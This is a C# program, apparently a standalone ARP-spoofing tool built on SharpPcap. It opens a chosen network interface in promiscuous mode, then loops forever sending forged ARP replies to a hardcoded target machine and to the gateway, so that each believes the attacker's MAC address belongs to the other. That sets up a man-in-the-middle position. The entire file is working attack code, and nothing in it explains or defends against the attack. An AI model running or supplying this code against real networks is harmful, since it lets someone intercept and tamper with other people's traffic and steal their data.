using System;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net;
using System.Net.NetworkInformation;

class Program
{
    static void Main()
    {
        var devices = CaptureDeviceList.Instance;
        if (devices.Count < 1)
        {
            Console.WriteLine("No iface found!");
            return;
        }

        for (int i = 0; i < devices.Count; i++)
        {
            var dev = devices[i];
            Console.WriteLine("{0}: Name: {1} | Desc: {2} | Mac: {3}", i, dev.Name, dev.Description, dev.MacAddress);
        }

        Console.WriteLine("Select an interface by entering the corresponding number:");

        int selectedIndex;
        while (!int.TryParse(Console.ReadLine(), out selectedIndex) || selectedIndex < 0 || selectedIndex >= devices.Count)
        {
            Console.WriteLine("Invalid selection. Please enter a valid number.");
        }

        var device = devices[selectedIndex];
        Console.WriteLine("Using: {0}", device.Name);
        device.Open(DeviceModes.Promiscuous);

        PhysicalAddress attackerMac = device.MacAddress; // ATTACKER MAC ADDRESS
        PhysicalAddress targetMac = PhysicalAddress.Parse("60-AB-67-E7-17-51"); // TARGET MAC ADDRESS
        PhysicalAddress gatewayMac = PhysicalAddress.Parse("94-2C-B3-F9-31-2D"); // GATEWAY MAC ADDRESS

        var targetIp = IPAddress.Parse("192.168.0.53"); // TARGET IP
        var gatewayIp = IPAddress.Parse("192.168.0.1"); // GATEWAY IP

        var ethernetPacket = new EthernetPacket(attackerMac, targetMac, EthernetType.Arp);

        while (true)
        {
            try
            {
                var arpReplyToTarget = new ArpPacket(
                    ArpOperation.Response,
                    targetMac,
                    targetIp,
                    attackerMac,
                    gatewayIp
                );

                ethernetPacket.PayloadPacket = arpReplyToTarget;
                device.SendPacket(ethernetPacket);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("--- [SPOOFED REPLY TO TARGET {0}] ARP Packet sent ---", targetIp);
                Console.ResetColor();

                var arpReplyToGateway = new ArpPacket(
                    ArpOperation.Response,
                    gatewayMac,
                    gatewayIp,
                    attackerMac,
                    targetIp
                );

                ethernetPacket.PayloadPacket = arpReplyToGateway;
                device.SendPacket(ethernetPacket);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("--- [SPOOFED REPLY TO GATEWAY {0}] ARP Packet sent ---", gatewayIp);
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("--- ARP Packet NOT sent ---");
                Console.WriteLine(ex.Message);
                Console.ResetColor();
            }

            Thread.Sleep(2000);
        }

        //device.Close();
    }
}
